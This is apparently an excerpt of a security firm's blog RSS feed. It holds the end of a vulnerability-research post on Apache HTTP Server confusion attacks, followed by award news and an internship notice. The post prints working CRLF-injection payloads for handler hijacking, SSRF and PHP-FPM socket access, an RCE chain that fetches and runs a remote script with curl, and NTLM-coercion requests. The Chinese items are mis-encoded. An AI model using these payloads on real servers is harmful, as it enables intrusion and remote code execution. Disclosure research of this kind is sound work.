&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;‚úîÔ∏è 3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/h5&gt;

&lt;p&gt;It‚Äôs also easy to transform an image with a legitimate extension into a PHP backdoor. For instance, this primitive allows specifying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; to execute embedded malicious code within the image, like:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/uploads/avatar.webp&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:application/x-httpd-php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;Ô∏è-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;‚úîÔ∏è 3-2-2. Arbitrary Handler to Full SSRF&lt;/h5&gt;

&lt;p&gt;Calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; to access any protocol on any URL is, of course, straightforward:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:http://example.com/%3f&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Moreover, this is also a full-control SSRF where you can control all request headers and obtain all HTTP responses! A slight disappointment is when accessing Cloud Metadata, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; automatically adds an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Forwarded-For&lt;/code&gt; header, which gets blocked by EC2 and GCP‚Äôs &lt;a href=&quot;https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations&quot;&gt;Metadata protection mechanisms&lt;/a&gt;, otherwise, this would be an even more powerful primitive.&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;‚úîÔ∏è 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/h5&gt;

&lt;p&gt;However, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; offers a more ‚Äúconvenient‚Äù feature ‚Äî it can access local Unix Domain Sockets! üòâ&lt;/p&gt;

&lt;p&gt;Here‚Äôs a demonstration accessing PHP-FPM‚Äôs local Unix Domain Socket to execute a PHP backdoor located in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Theoretically, this technique has even more potential, such as protocol smuggling (smuggling FastCGI in HTTP/HTTPS protocols üòè) or exploiting other vulnerable local sockets. These possibilities are left for interested readers to explore.&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-3-2-4-arbitrary-handler-to-rce&quot;&gt;‚úîÔ∏è 3-2-4. Arbitrary Handler to RCE&lt;/h5&gt;

&lt;p&gt;Finally, let‚Äôs demonstrate how to transform this primitive into an RCE using a common CTF trick! Since the official &lt;a href=&quot;https://hub.docker.com/_/php&quot;&gt;PHP Docker&lt;/a&gt; image includes PEAR, a command-line PHP package management tool, using its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pearcmd.php&lt;/code&gt; as an entry point allows us to achieve further exploitation. You can check this article ‚Äî &lt;a href=&quot;https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&quot;&gt;Docker PHP LFI Summary&lt;/a&gt;, written by &lt;a href=&quot;https://x.com/phithon_xg&quot;&gt;Phith0n&lt;/a&gt; for details!&lt;/p&gt;

&lt;p&gt;Here we utilize a Command Injection within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run-tests&lt;/code&gt; to complete the entire exploit chain, detailed as follows:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It‚Äôs common to see CRLF Injection or Header Injection being reported as XSS in Security Advisories or Bug Bounties. While it is true that these can sometimes chain to impactful vulnerabilities like Account Takeover through SSO, please don‚Äôt forget that they can also lead to Server-Side RCE, as this demonstration proves its potential!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-4-other-vulnerabilities&quot;&gt;üî• 4. Other Vulnerabilities&lt;/h3&gt;

&lt;p&gt;While this essentially covers the Confusion Attacks, some minor vulnerabilities discovered during our research of Apache HTTP Server are worth mentioning separately.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-cve-2024-38472---windows-unc-based-ssrf&quot;&gt;‚öîÔ∏è CVE-2024-38472 - Windows UNC-based SSRF&lt;/h4&gt;

&lt;p&gt;Firstly, the Windows implementation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apr_filepath_merge()&lt;/code&gt; function allows the use of UNC paths, which allows attackers to coerce NTLM authentication to any host. Here we list two different triggering paths:&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-triggered-via-http-request-parser&quot;&gt;‚úîÔ∏è Triggered via HTTP Request Parser&lt;/h5&gt;

&lt;p&gt;Direct triggering through an HTTP request parser in Httpd requires additional configuration, which might seem impractical at first glance but often appears with Tomcat (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_jk&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_ajp&lt;/code&gt;) or pairing with &lt;a href=&quot;https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes&quot;&gt;PATH_INFO&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Additionally, since Httpd rewrote its core HTTP request parser logic after 2.4.49, triggering the vulnerability in versions above requires an additional configuration:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
MergeSlashes &lt;span class=&quot;ss&quot;&gt;Off&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By using two &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%5C&lt;/code&gt; can force Httpd to coerce NTLM authentication to an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attacker-server&lt;/code&gt;, and practically, this SSRF can be converted into RCE through &lt;a href=&quot;https://en.hackndo.com/ntlm-relay/&quot;&gt;NTLM Relay&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/%5C%5Cattacker-server/path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-triggered-via-type-map&quot;&gt;‚úîÔ∏è Triggered via Type-Map&lt;/h5&gt;

&lt;p&gt;In the &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235&quot;&gt;Debian/Ubuntu&lt;/a&gt; distribution of Httpd, Type-Map is enabled by default:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; type-map &lt;span class=&quot;ss&quot;&gt;var&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By uploading a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; file to the server and setting the URI field to a UNC path, you can also force the server to coerce NTLM authentication to the attacker. This is also &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle&quot;&gt;the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; trick&lt;/a&gt; I proposed. üòâ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-cve-2024-39573---ssrf-via-full-control-of-rewriterule-prefix&quot;&gt;‚öîÔ∏è CVE-2024-39573 - SSRF via Full Control of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; Prefix&lt;/h4&gt;

&lt;p&gt;Lastly, when you have full control over the prefix of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; substitution target in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost&lt;/code&gt; is fully controllable, you can invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; and its sub-modules:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/broken(.*) $1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the following URL can delegate the request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; for processing:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/brokenproxy:unix:/run/[...]|http://path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But if administrators have tested the rule properly, they would realize that such rules are impractical. Thus, originally it was reported along with another vulnerability as an exploit chain, but this behavior was also treated as a security boundary fix by the security team. As the patches came out, other researchers applied the same behavior to Windows UNC and obtained another additional CVE.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;future-works&quot;&gt;Future Works&lt;/h2&gt;

&lt;p&gt;Finally, let‚Äôs talk about future works and areas for improvement in this research. Confusion Attacks are still a very promising attack surface, especially since my research focused mainly on just two fields. Unless the Apache HTTP Server undergoes architectural improvements or provides better development standards, I believe we‚Äôll see more ‚Äúconfusions‚Äù in the future!&lt;/p&gt;

&lt;p&gt;So, what other areas could be enhanced? In reality, different Httpd distributions have different configurations, so other Unix-Like systems such as the RHEL series, BSD family, and even applications that utilize Httpd might have more escapable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;, more powerful local gadgets, and unexpected symbolic jumps. These are all left for those interested to continue exploring.&lt;/p&gt;

&lt;p&gt;Due to time constraints, I was unable to share more real-world cases found and exploited in actual websites, devices, or even open-source projects. However, you can probably imagine ‚Äî the real world is still full of countless unexplored rules, bypassable authentications, and hidden CGIs waiting to be uncovered. How to hunt these techniques worldwide? That‚Äôs your mission!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Maintaining an open-source project is truly challenging, especially when trying to balance user convenience with the compatibility of older versions. A slight oversight can lead to the entire system being compromised, such as what happened with Httpd 2.4.49, where a minor change in path processing logic led to the disastrous &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773&quot;&gt;CVE-2021-41773&lt;/a&gt;. The entire development process must be carefully built upon a pile of legacy code and technical debt. So, if any Apache HTTP Server developers are reading this: Thank you for your hard work and contributions!&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/</link>
                <guid>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en</guid>
                <pubDate>Fri, 09 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Angelboy ÂÖ•ÂàóÂæÆËªü MSRC 2024 ÂâçÁôæÂ§ßÊúÄÊúâÂÉπÂÄºË≥áÂÆâÁ†îÁ©∂Âì°ÔºÅ</title>
                <description>&lt;p&gt;ÊÅ≠Âñú DEVCORE Ë≥áÊ∑±Ë≥áÂÆâÁ†îÁ©∂Âì° Angelboy Ê¶ÆÁç≤ Microsoft ÁöÑ MSRC 2024 Most Valuable Security Researchers ÁöÑÊÆäÊ¶ÆÔºÅÈô§‰∫ÜÂú®‰∏çÂàÜÈ†Ö TOP 100 ÂêçÂñÆ‰∏≠Ê¶ÆÁç≤ #33 ÂêçÔºåÂú® Angelboy Èï∑Âπ¥Á†îÁ©∂ÁöÑ Windows È†òÂüü‰∏≠Ôºå‰ªñÊõ¥‰ª• #9 ÁöÑÂêçÊ¨°Êì†ÂÖ•ÂâçÂçÅÂ§ßË°åÂàó„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄô‰∏çÂÉÖÊòØ Angelboy È¶ñÊ¨°Áôª‰∏äË©≤Âπ¥Â∫¶Ê¶úÂñÆÔºåÂêåÊôÇ‰πüÊòØË©≤ÂêçÂñÆ‰∏≠ÊéíÂêçÊúÄÈ´òÁöÑÂè∞ÁÅ£Ë≥áÂÆâÁ†îÁ©∂Âì°„ÄÇ&lt;/p&gt;

&lt;p&gt;Microsoft Êóó‰∏ãÁöÑ Microsoft Security Response CenterÔºàMSRCÔºåÊàñÁ®± Microsoft ÂÆâÂÖ®ÊÄßÂõûÊáâ‰∏≠ÂøÉÔºâÈï∑ÊúüËóâ Microsoft Researcher Recognition ProgramÔºàMRRRÔºâË®àÁï´ÔºåÂÖ¨ÈñãË°®ÊèöÂçîÂä© Microsoft ÊåñÊéòÁ≥ªÁµ±ÂÆâÂÖ®ÊºèÊ¥ûÁöÑË≥áÂÆâÁ†îÁ©∂Âì°Ôºå‰ª•Ê≠§Ëá¥Ë¨ùÂÑ™ÁßÄË≥áÂÆâÁ†îÁ©∂Âì°ÁÇ∫ Microsoft ÁöÑÂÆ¢Êà∂ÂèäÁî¢ÂìÅÂÆâÂÖ®ÊâÄ‰ªòÂá∫ÁöÑÂä™Âäõ„ÄÇ&lt;/p&gt;

&lt;p&gt;Microsoft Êñº 7 Êó•ÂÖ¨Â∏ÉÁöÑ MSRC 2024 Most Valuable Security Researchers ÂêçÂñÆÔºåÊòØÊ†πÊìö 2023 Âπ¥ 7 ÊúàËá≥ 2024 Âπ¥ 6 ÊúàÔºåÂÖ®ÁêÉÂêÑÂú∞Ë≥áÂÆâÁ†îÁ©∂Âì°Âêë MSRC ÂõûÂ†±ÁöÑÊºèÊ¥ûÂæóÂàÜÊâÄÁµ±Ë®àËÄåÂæó„ÄÇÂú®Êï¥È´î‰∏çÂàÜÈ†ÖÂêçÂñÆ‰∏≠ÔºåAngelboy Áç≤Âæó‰∫Ü #33 ÂêçÁöÑÊÆäÊ¶Æ„ÄÇËÄåÈáùÂ∞ç Microsoft Êóó‰∏ãÂêÑÈ°ûÂûãÁî¢ÂìÅÁöÑ Windows È°ûÂà•‰∏≠ÔºåAngelboy ÂâáÂÖ•Âàó TOP 10ÔºåÁç≤Âæó #9 ÁöÑÊàêÁ∏æÔºå‰∏¶Á∂ìË™çË≠âÂÖ®Êï∏ÊºèÊ¥ûÂõûÂ†±ÁöÜÁÇ∫ÊúâÊïàÂõûÂ†±„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂÜçÊ¨°ÊÅ≠Âñú Angelboy Â•™ÂæóÊ≠§‰∏ÄÊÆäÊ¶ÆÔºÅ&lt;/p&gt;

&lt;p&gt;ÂèÉËÄÉË≥áÊñôÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2024/08/congratulations-to-the-msrc-2024-most-valuable-security-researchers/&quot;&gt;Microsoft official announcement - Congratulations to the MSRC 2024 Most Valuable Security Researchers!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/leaderboard&quot;&gt;Microsoft MSRC 2024 leaderboard&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy/</link>
                <guid>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy</guid>
                <pubDate>Thu, 08 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>MSRC 2024 Most Valuable Security Researchers - Angelboy</title>
                <description>&lt;p&gt;We‚Äôre thrilled to announce that Angelboy, senior security researcher at DEVCORE, is named one of Microsoft‚Äôs MSRC 2024 Most Valuable Security Researchers! He not only secured the #33 spot on the overall list but also achieved the #9 position in the Windows category.&lt;/p&gt;

&lt;p&gt;This is the first time Angelboy has been shortlisted on this annual leaderboard, and he is also the highest-ranked Taiwanese security researcher featured. This prestigious accomplishment highlights his exceptional expertise and significant contributions to the field.&lt;/p&gt;

&lt;p&gt;The Microsoft Security Response Center (MSRC) has long recognized the efforts of security researchers who partner with Microsoft in reporting vulnerabilities through its Microsoft Researcher Recognition Program (MRRR). The program expresses gratitude for their contributions to the security of Microsoft‚Äôs global customers and products.&lt;/p&gt;

&lt;p&gt;The MSRC 2024 Most Valuable Security Researchers list, announced on August 7th, is based on the total number of points the researchers earned for each valid report from July 2023 to June 2024. Angelboy secured the #33 spots on the leaderboard. Specifically, his dedicated passion for Windows Kernel research earned him a #9 ranking in the Windows category, placing him in the TOP 10. He was also awarded ‚ÄúAccuracy‚Äù and ‚ÄúVolume‚Äù badges, further highlighting his significant contributions to vulnerability research.&lt;/p&gt;

&lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2024/08/congratulations-to-the-msrc-2024-most-valuable-security-researchers/&quot;&gt;Microsoft official announcement - Congratulations to the MSRC 2024 Most Valuable Security Researchers!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/leaderboard&quot;&gt;Microsoft MSRC 2024 leaderboard&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy-en/</link>
                <guid>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy-en</guid>
                <pubDate>Thu, 08 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2024 Á¨¨ÂÖ≠Â±ÜÂØ¶ÁøíÁîüË®àÁï´</title>
                <description>&lt;p&gt;DEVCORE ÂâµÁ´ãËøÑ‰ªäÂ∑≤ÈÄæÂçÅÂπ¥ÔºåÊåÅÁ∫åÂ∞àÊ≥®ÊñºÊèê‰æõ‰∏ªÂãïÂºèË≥áÂÆâÊúçÂãôÔºå‰∏¶Ëá¥ÂäõÂ∞ãÊâæÂêÑÁ®ÆÂÆâÂÖ®È¢®Èö™ÂèäÊºèÊ¥ûÔºåËÆì‰∏ñÁïåËÆäÂæóÊõ¥ÂÆâÂÖ®„ÄÇÁÇ∫‰∫ÜÊåÅÁ∫åÂ∞ãÊâæÊõ¥Â§öÊìÅÊúâÁõ∏ÂêåÁêÜÂøµÁöÑË≥áÂÆâÊñ∞Èä≥„ÄÅÂçîÂä©Â≠∏ÁîüÂª∫ÊßãÊ≠£Á¢∫Ë≥áÂÆâÊÑèË≠òÂèäÊäÄËÉΩÔºåÊàëÂÄëÊàêÁ´ã‰∫Ü„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÔºå2022 Âπ¥ÂàùÈñãÂßãËàâËæ¶È¶ñÂ±ÜÂØ¶ÁøíÁîüË®àÁï´ÔºåÁõÆÂâçÁÇ∫Ê≠¢ÊàêÊûúÈ†óË±ê„ÄÅË∂Ö‰πéÈ†êÊúüÔºåÁ¨¨‰∫îÂ±ÜÂØ¶ÁøíÁîüË®àÁï´‰πüÂ∞áÊñº‰ªäÂπ¥ 7 ÊúàÂ∫ïÂëä‰∏ÄÊÆµËêΩ„ÄÇÊàëÂÄëÂæàÊ¶ÆÂπ∏Âú∞ÂÆ£‰ΩàÔºåÁ¨¨ÂÖ≠Â±ÜÂØ¶ÁøíÁîüË®àÁï´Âç≥Â∞áÁôªÂ†¥ÔºåËã•ÊÇ®ÊúüÂæÖÂä†ÂÖ•ÊàëÂÄë„ÄÅÁ≤æÈÄ≤Ë≥áÂÆâÊäÄËÉΩÔºåÁÖ©Ë´ãË©≥Èñ±‰∏ãÂàóË≥áË®äÂæå‰æÜ‰ø°Â†±ÂêçÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÂÖßÂÆπ&quot;&gt;ÂØ¶ÁøíÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÂØ¶ÁøíÂàÜÁÇ∫ Research Âèä Red Team ÂÖ©ÂÄãÁµÑÂà•Ôºå‰∏ªË¶ÅÂÖßÂÆπÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Research (Binary/Web)
‰ª•Á†îÁ©∂ÁÇ∫‰∏ªÔºåÂú®ËàáÂ∞éÂ∏´Á¢∫ÂÆöÁ†îÁ©∂Ê®ôÁöÑÂæåÔºåÂàÜÊûêÁõÆÊ®ôÊû∂Êßã„ÄÅÈÄ≤Ë°åÈÄÜÂêëÂ∑•Á®ãÊàñÁ®ãÂºèÁ¢ºÂØ©Êü•„ÄÇËóâÁî±ÈÄôÂÄãÈÅéÁ®ãË®ìÁ∑¥Ëá™Â∑±ÁöÑÊÄùË∑ØÔºåÊâæÂá∫ÂèØËÉΩÁöÑÊîªÊìäÈù¢ËàáÊΩõÂú®ÁöÑÂº±Èªû„ÄÇÂè¶Â§ñ‰πüÊúÉËÆìÂ§ßÂÆ∂ÂòóË©¶ÂàÜÊûêÂèäÊí∞ÂØ´ÈÅéÂæÄÊºèÊ¥ûÁöÑ ExploitÔºåÁêÜËß£ÈÅéÂéªÊºèÊ¥ûÈÉΩÂá∫ÁèæÂú®Âì™ÔºåÈ´îÈ©óÁúüÂØ¶‰∏ñÁïåÁöÑÊºèÊ¥ûÈÉΩÊòØÂ¶Ç‰ΩïÂà©Áî®„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûÊåñÊéòÂèäÁ†îÁ©∂ 60 %&lt;/li&gt;
      &lt;li&gt;1-day ÈñãÁôº (Exploitation) 30 %&lt;/li&gt;
      &lt;li&gt;ÊàêÊûúÂ†±ÂëäËàáÊ∫ñÂÇô 10 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Red Team
Á†îÁ©∂‰∏¶Ê∑±ÂÖ•Â≠∏ÁøíÁ¥ÖÈöäÂ∏∏Áî®ÊäÄÂ∑ßÔºåÁÜüÊÇâÂØ¶Êà∞‰∏≠ÊúÉÈÅáÂà∞ÁöÑÊÉÖÂ¢É„ÄÅË™ûË®ÄËàáÊû∂Êßã„ÄÇ‰∫ÜËß£Â∏∏Ë¶ãÊºèÊ¥ûÁöÑÊàêÂõ†„ÄÅÂØ¶ÈöõÂà©Áî®ÊñπÊ≥ï„ÄÅÂö¥ËãõÊ¢ù‰ª∂‰∏ãÁöÑÂà©Áî®Á≠ñÁï•„ÄÅÈªëÁÆ±Ê∏¨Ë©¶ÊñπÂºèÂèäÂêÑÁ®ÆÂ•áÊäÄÊ∑´Â∑ß„ÄÇÂ≠∏ÁøíÂæåÊª≤ÈÄèÊôÇÁöÑÂ∏∏Ë¶ãÈôêÂà∂„ÄÅÂ∑•ÂÖ∑Ê¶ÇÂøµËàáÂéüÁêÜ„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûËàáÊäÄÂ∑ßÁöÑÁ†îÁ©∂ÂèäÊ∑±ÂÖ•Â≠∏Áøí 70 %&lt;/li&gt;
      &lt;li&gt;Lab Âª∫ÁΩÆÊàñ Bug Bounty ÊàñÊºèÊ¥ûÊåñÊéò 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂÖ¨Âè∏Âú∞Èªû&quot;&gt;ÂÖ¨Âè∏Âú∞Èªû&lt;/h3&gt;

&lt;p&gt;Âè∞ÂåóÂ∏ÇÊùæÂ±±ÂçÄÂÖ´Âæ∑Ë∑Ø‰∏âÊÆµ 32 Ëôü 13 Ê®ì&lt;/p&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊôÇÈñì&quot;&gt;ÂØ¶ÁøíÊôÇÈñì&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2024 Âπ¥ 9 ÊúàÈñãÂßãÂà∞ 2025 Âπ¥ 1 ÊúàÂ∫ïÔºåÂÖ± 5 ÂÄãÊúà„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊØèÈÄ±Â∑•‰ΩúÂÖ©Â§©ÔºåÂ∑•‰ΩúÊôÇÈñìÁÇ∫ 10:00 ‚Äì 18:00
    &lt;ul&gt;
      &lt;li&gt;ÊØèÈÄ±Âõ∫ÂÆö‰∏ÄÂ§©‰∏ãÂçà 14:00 - 18:00 ÂøÖÈ†àÂà∞ÂÖ¨Âè∏Ë®éË´ñÈÄ≤Â∫¶
        &lt;ul&gt;
          &lt;li&gt;Â¶ÇÊûúÂ±Ö‰ΩèÈõôÂåóÂ§ñÂèØÂΩàÊÄßË™øÊï¥Ôºà‰ΩÜÈ†àÊØèÂÄãÁµÑÂà•Áµ±‰∏ÄÔºâ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ÂÖ∂È§òÊôÇÈñìÁöÜÁÇ∫ÈÅ†Á´Ø‰ΩúÊ•≠&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊãõÂãüÂ∞çË±°&quot;&gt;ÊãõÂãüÂ∞çË±°&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;ÂÖ∑Êúâ‰∏ÄÂÆöÁ®ãÂ∫¶Ë≥áÂÆâËÉåÊôØÁöÑÂ≠∏ÁîüÔºå‰∏îÂèØÊØèÈÄ±Â∑•‰ΩúÂÖ©Â§©&lt;/li&gt;
  &lt;li&gt;Ê≠§Â§ñ‰∏¶ÁÑ°ÂÖ∂‰ªñÊãõÂãüÈôêÂà∂ÔºåÊ≠∑Â±ÜÂØ¶ÁøíÁîüÂèØÈáçË§áÊáâÂæµ&lt;/li&gt;
